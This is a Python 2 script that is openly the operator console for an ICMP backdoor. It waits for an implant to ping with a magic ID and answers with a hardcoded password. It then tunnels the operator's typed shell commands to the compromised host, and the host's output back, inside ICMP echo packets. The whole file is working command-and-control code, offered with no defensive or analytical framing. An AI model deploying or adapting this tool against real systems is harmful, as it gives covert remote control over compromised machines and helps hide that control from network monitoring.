#!/usr/bin/env python
# encoding: utf-8

import os, sys, socket, struct, select, string

MY_ID = 1337
PASSWORD = "h4ck3r"

def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def receive_one_ping(my_socket):
    while True:
        whatReady = select.select([my_socket], [], [], 2)
        if whatReady[0] == []:
            continue
        recPacket, addr = my_socket.recvfrom(2048)
        nRecv = len(recPacket)
        while nRecv == 2048:
            recPacket_p, addr = my_socket.recvfrom(2048)
            recPacket = recPacket + recPacket_p[28:]
            nRecv = len(recPacket_p)
        icmpHeader = recPacket[20:28]
        type, code, checksum, packetID, sequence = struct.unpack("bbHHh", icmpHeader)
        if type == 0 and code == 0 and packetID == MY_ID:
            return addr[0], sequence, recPacket[28:]

def send_one_ping(my_socket, dest_addr, ID, seq, data):
    dest_addr = socket.gethostbyname(dest_addr)
    header = struct.pack("bbHHh", 0, 0, 0, ID, seq)
    my_checksum = checksum(header + data)
    header = struct.pack("bbHHh", 0, 0, socket.htons(my_checksum), ID, seq)
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))

if __name__ == "__main__":
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
        print "Waiting for backdoor to connect..."
        while (True):
            target_ip, sequence, data = receive_one_ping(my_socket)
            if data == "EXIT1337":
                continue
            if sequence == MY_ID:
                print "Backdoor connected, sending password..."
                send_one_ping(my_socket, target_ip, MY_ID, sequence+1, PASSWORD)
            else:
                print data
                cmd = raw_input()
                if cmd != "":
                    send_one_ping(my_socket, target_ip, MY_ID, sequence+1, cmd)
    except socket.gaierror, e:
       print e[1]
    except (KeyboardInterrupt, EOFError):
       send_one_ping(my_socket, target_ip, MY_ID, MY_ID, "EXIT1337")
       my_socket.close()
